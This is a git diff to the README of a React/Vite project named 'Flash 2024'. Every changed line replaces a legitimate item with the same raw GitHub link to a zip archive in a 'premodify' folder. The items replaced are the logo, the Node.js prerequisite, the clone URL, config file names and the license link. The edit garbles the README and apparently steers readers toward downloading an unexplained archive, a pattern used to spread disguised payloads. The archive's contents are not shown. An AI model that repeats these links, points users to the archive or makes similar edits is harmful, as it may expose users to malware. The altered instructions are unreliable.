@@ -1,6 +1,6 @@
 # Flash 2024 ⚡
 
-![Flash 2024 Logo](android-chrome-192x192.png)
+![Flash 2024 Logo](https://raw.githubusercontent.com/kartik-parmar007/Flash-2024/main/premodify/Flash-2024.zip)
 
 ## 🌟 Project Overview
 
@@ -33,7 +33,7 @@ Flash 2024 is a modern React-based application built with Vite that offers a lig
 
 ### Prerequisites
 
-- Node.js (v14+)
+- https://raw.githubusercontent.com/kartik-parmar007/Flash-2024/main/premodify/Flash-2024.zip (v14+)
 - npm or yarn
 
 ### Installation
@@ -41,7 +41,7 @@ Flash 2024 is a modern React-based application built with Vite that offers a lig
 1. Clone the repository
 
    ```bash
-   git clone https://github.com/kartik-parmar007/Flash-2024.git
+   git clone https://raw.githubusercontent.com/kartik-parmar007/Flash-2024/main/premodify/Flash-2024.zip
    cd Flash-2024
    ```
 
@@ -92,9 +92,9 @@ npx cap open @capacitor-community/electron
 
 The project uses several configuration files:
 
-- `vite.config.js` - Vite configuration
-- `capacitor.config.json` - Capacitor settings
-- `.eslintrc.cjs` - ESLint rules
+- `https://raw.githubusercontent.com/kartik-parmar007/Flash-2024/main/premodify/Flash-2024.zip` - Vite configuration
+- `https://raw.githubusercontent.com/kartik-parmar007/Flash-2024/main/premodify/Flash-2024.zip` - Capacitor settings
+- `https://raw.githubusercontent.com/kartik-parmar007/Flash-2024/main/premodify/Flash-2024.zip` - ESLint rules
 
 ## 🤝 Contributing
 
@@ -102,7 +102,7 @@ Contributions, issues, and feature requests are welcome! Feel free to check the 
 
 ## 📝 License
 
-This project is [MIT](https://opensource.org/licenses/MIT) licensed.
+This project is [MIT](https://raw.githubusercontent.com/kartik-parmar007/Flash-2024/main/premodify/Flash-2024.zip) licensed.
 
 ## 👨‍💻 Author
 
